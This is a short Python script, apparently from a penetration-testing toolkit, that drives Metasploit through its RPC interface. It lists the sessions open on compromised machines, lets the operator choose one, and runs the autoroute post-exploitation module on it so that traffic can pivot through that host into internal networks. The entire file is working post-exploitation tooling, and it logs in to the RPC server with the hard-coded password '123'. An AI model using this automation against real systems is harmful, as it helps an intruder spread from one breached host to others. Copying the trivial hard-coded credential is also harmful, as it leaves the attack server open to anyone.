from library.pymetasploit3.msfrpc import MsfRpcClient


def init(client,sid):
    cid = client.consoles.console().cid
    post = client.modules.use('post', 'multi/manage/autoroute')
    post['SESSION'] = int(sid)
    output = (client.consoles.console(cid).run_module_with_output(post).split('['))
    x=1
    while x < len(output):
        print("[{}".format(output[x]),end= '')
        x+=1
    pivotip = client.sessions.list.get(sid).get('session_host')
    return pivotip


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    print("Select sessions to proceed: \n")
    if len(client.sessions.list.items())<1 :
        print("There are no sessions available")
        exit()
    for id,c in client.sessions.list.items():
        print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))
    print("---------------------------------")
    sid = input()
    print("--------------------------------- \n")
    init(client,sid)